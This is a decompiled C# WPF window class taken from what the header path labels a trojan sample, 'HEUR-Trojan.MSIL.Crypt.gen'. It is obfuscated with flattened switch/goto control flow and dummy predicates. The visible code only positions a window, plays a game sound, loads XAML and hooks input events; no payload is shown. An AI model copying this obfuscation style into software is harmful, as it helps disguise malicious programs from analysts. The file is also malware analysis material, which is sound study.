// Decompiled with JetBrains decompiler
// Type: DebuggerTypeProxyAttrib.States.Listener
// Assembly: DebuggerTypeProxyAttrib, Version=1.7.3.0, Culture=neutral, PublicKeyToken=null
// MVID: 3D9F2D5D-94C2-4B9B-BC0A-C78BF30C6035
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.03\HEUR-Trojan.MSIL.Crypt.gen-5acf494024d29f4957958fce64819adc19bc7cffa6d323531e5a321496a04ae0.exe

using DebuggerTypeProxyAttrib.Collections;
using DebuggerTypeProxyAttrib.Pages;
using System;
using System.CodeDom.Compiler;
using System.ComponentModel;
using System.Diagnostics;
using System.Runtime.CompilerServices;
using System.Windows;
using System.Windows.Documents;
using System.Windows.Input;
using System.Windows.Markup;
using System.Windows.Media;
using Tourield.Roles;

namespace DebuggerTypeProxyAttrib.States
{
  public class Listener : Window, IComponentConnector
  {
    public GlobalErrorCollection m_Test;
    private List m_Repository;
    public ExporterFactoryRole identifier;
    private MediaPlayer m_Proxy;
    private bool m_Utils;

    [MethodImpl(MethodImplOptions.NoInlining)]
    public Listener()
    {
      int num1 = 0;
      if (true)
        goto label_3;
label_1:
      this.Content = (object) this.m_Test.proccesor;
      this.Top = 30.0;
      goto label_6;
label_2:
      int num2;
      num1 = num2;
label_3:
      while (true)
      {
        switch (num1)
        {
          case 0:
            goto label_7;
          case 1:
          case 5:
            goto label_5;
          case 2:
          case 4:
            goto label_1;
          case 3:
            goto label_6;
          case 6:
            goto label_8;
          default:
            if (!Listener.ValidateAttribute())
            {
              num1 = 3;
              continue;
            }
            goto label_5;
        }
      }
label_8:
      return;
label_5:
      this.m_Repository = new List();
      this.m_Proxy = new MediaPlayer();
      // ISSUE: explicit constructor call
      base.\u002Ector();
      this.m_Test = new GlobalErrorCollection();
      num2 = 4;
      goto label_2;
label_7:
      RegistryPagePage.ListMethod();
      num2 = 5;
      goto label_2;
label_6:
      this.Left = 360.0;
      num2 = 6;
      goto label_2;
    }

    [MethodImpl(MethodImplOptions.NoInlining)]
    public void FillOrder()
    {
      int num1 = 4;
      while (true)
      {
        int num2 = num1;
        while (true)
        {
          switch (num2)
          {
            case 0:
            case 4:
              goto label_6;
            case 1:
            case 3:
              goto label_2;
            case 2:
              goto label_1;
            case 5:
              goto label_7;
            default:
              if (true)
              {
                num2 = 2;
                continue;
              }
              goto label_6;
          }
        }
label_1:
        this.m_Proxy.Play();
        num1 = 5;
        continue;
label_2:
        this.m_Proxy.Volume = 0.5;
        goto label_1;
label_6:
        this.m_Proxy.Open(new Uri("..\\..\\Game\\GameSounds\\SuperMario3DWorld_Theme.wav", UriKind.Relative));
        num1 = 3;
      }
label_7:;
    }

    [MethodImpl(MethodImplOptions.NoInlining)]
    private void CallOrder(object def, KeyEventArgs ivk) => this.m_Test.DefineOrder(def, ivk);

    [MethodImpl(MethodImplOptions.NoInlining)]
    private void ChangeOrder(object config, MouseButtonEventArgs attr) => this.m_Test.DeleteOrder(config, attr);

    [MethodImpl(MethodImplOptions.NoInlining)]
    private void PostOrder(object i, RoutedEventArgs caller)
    {
      int num1 = 2;
      while (true)
      {
        int num2 = num1;
        while (true)
        {
          switch (num2)
          {
            case 0:
            case 2:
              this.FillOrder();
              if (true)
              {
                num2 = 3;
                continue;
              }
              goto label_7;
            case 1:
            case 3:
              this.identifier = new ExporterFactoryRole(ref this.m_Test);
              goto case 4;
            case 4:
              this.identifier.PrintOrder();
              if (Listener.ManageAttribute())
              {
                num2 = 5;
                continue;
              }
              goto case 1;
            case 5:
              goto label_9;
            default:
              goto label_5;
          }
        }
label_5:
        num1 = 4;
      }
label_9:
      return;
label_7:;
    }

    [DebuggerNonUserCode]
    [GeneratedCode("PresentationBuildTasks", "4.0.0.0")]
    [MethodImpl(MethodImplOptions.NoInlining)]
    public void InitializeComponent()
    {
      int num1 = 5;
      while (true)
      {
        int num2 = num1;
        bool utils;
        while (true)
        {
          switch (num2)
          {
            case 0:
            case 3:
              goto label_8;
            case 1:
              if (!utils)
              {
                this.m_Utils = true;
                if (true)
                {
                  num2 = 4;
                  continue;
                }
                goto label_3;
              }
              else
                goto label_10;
            case 2:
            case 4:
              goto label_4;
            case 5:
              goto label_3;
            case 6:
              goto label_9;
            default:
              goto label_7;
          }
        }
label_3:
        utils = this.m_Utils;
        num1 = 1;
        continue;
label_4:
        Uri resourceLocator = new Uri("/DebuggerTypeProxyAttrib;component/mainwindow.xaml", UriKind.Relative);
        goto label_8;
label_7:
        num1 = 0;
        continue;
label_8:
        Application.LoadComponent((object) this, resourceLocator);
        num1 = 6;
      }
label_10:
      return;
label_9:;
    }

    [EditorBrowsable(EditorBrowsableState.Never)]
    [GeneratedCode("PresentationBuildTasks", "4.0.0.0")]
    [DebuggerNonUserCode]
    [MethodImpl(MethodImplOptions.NoInlining)]
    void IComponentConnector.Connect(int index_def, object cont)
    {
      int num1 = 3;
      if (false)
        return;
      while (true)
      {
        int num2;
        int num3;
        switch (num1)
        {
          case 0:
          case 3:
            num3 = index_def;
            if (true)
            {
              num1 = 2;
              continue;
            }
            goto case 1;
          case 1:
          case 2:
            if (num3 != 1)
            {
              num2 = 5;
              break;
            }
            goto label_4;
          case 4:
            goto label_3;
          case 5:
            this.m_Utils = true;
            num2 = 6;
            break;
          case 6:
            goto label_12;
          default:
            if (Listener.ManageAttribute())
            {
              num1 = 4;
              continue;
            }
            goto case 0;
        }
        num1 = num2;
      }
label_4:
      ((UIElement) cont).KeyDown += new KeyEventHandler(this.CallOrder);
      ((UIElement) cont).MouseDown += new MouseButtonEventHandler(this.ChangeOrder);
      ((FrameworkElement) cont).Loaded += new RoutedEventHandler(this.PostOrder);
      return;
label_12:
      return;
label_3:;
    }

    internal static bool ManageAttribute() => true;

    internal static bool ValidateAttribute() => false;
  }
}
